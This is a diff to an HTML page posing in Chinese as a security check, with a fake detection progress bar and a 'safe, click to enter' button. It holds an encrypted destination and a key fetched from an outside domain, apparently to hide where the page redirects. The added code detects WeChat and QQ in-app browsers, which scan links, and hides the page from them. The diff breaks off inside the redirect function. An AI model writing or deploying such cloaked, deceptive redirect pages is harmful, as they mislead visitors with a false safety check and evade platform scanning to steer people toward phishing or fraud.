@@ -10,8 +10,10 @@
       margin: 0;
       background: #f4faf7;
       font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-      display: flex; flex-direction: column;
-      justify-content: center; align-items: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
       text-align: center;
       color: #333;
@@ -31,7 +33,8 @@
       animation: pulse 1.5s infinite ease-in-out;
     }
     .shield svg {
-      width: 100%; height: 100%;
+      width: 100%;
+      height: 100%;
       fill: #4caf50;
     }
     @keyframes pulse {
@@ -75,11 +78,22 @@
       margin-top: 8px;
       color: #444;
     }
+
+    #block {
+      display: none;
+      font-size: 18px;
+      padding: 30px;
+      max-width: 380px;
+      line-height: 1.6;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+    }
   </style>
 </head>
 <body>
 
-<div class="panel">
+<div id="main" class="panel">
   <div class="shield">
     <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
   </div>
@@ -90,28 +104,39 @@
   <button id="btn" onclick="jump()">✅ 安全 · 点击进入</button>
 </div>
 
+<div id="block">
+  请在浏览器中打开访问
+</div>
+
 <script>
   const encrypted = "U2FsdGVkX192A/lRyN+7xSW3daQeJKRMCfQka+RoY/j7WtxgrEOyliyV8oStPAwum2oyA0qX9tUHQ6UnBpButg==";
   const keyURL = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
-  const duration = 3000; // 检测时长，毫秒
+  const duration = 3000;
 
-  const bar = document.getElementById("bar");
-  const text = document.getElementById("text");
-  const btn = document.getElementById("btn");
-  const percentTxt = document.getElementById("progress-text");
+  // 提示
+  const ua = navigator.userAgent.toLowerCase();
+  if (/micromessenger|qq\//.test(ua)) {
+    document.getElementById("main").style.display = "none";
+    document.getElementById("block").style.display = "block";
+  } else {
+    let start = Date.now();
+    const bar = document.getElementById("bar");
+    const text = document.getElementById("text");
+    const btn = document.getElementById("btn");
+    const percentTxt = document.getElementById("progress-text");
 
-  let start = Date.now();
-  const timer = setInterval(() => {
-    const percent = Math.min(100, ((Date.now() - start) / duration) * 100);
-    const rounded = Math.floor(percent);
-    bar.style.width = rounded + "%";
-    percentTxt.innerText = "检测进度：" + rounded + "%";
-    if (percent >= 100) {
-      clearInterval(timer);
-      text.innerText = "检测完成，请点击按钮进入页面";
-      btn.style.display = "inline-block";
-    }
-  }, 50);
+    const timer = setInterval(() => {
+      const percent = Math.min(100, ((Date.now() - start) / duration) * 100);
+      const rounded = Math.floor(percent);
+      bar.style.width = rounded + "%";
+      percentTxt.innerText = "检测进度：" + rounded + "%";
+      if (percent >= 100) {
+        clearInterval(timer);
+        text.innerText = "检测完成，请点击按钮进入页面";
+        btn.style.display = "inline-block";
+      }
+    }, 50);
+  }
 
   async function jump() {
     try {
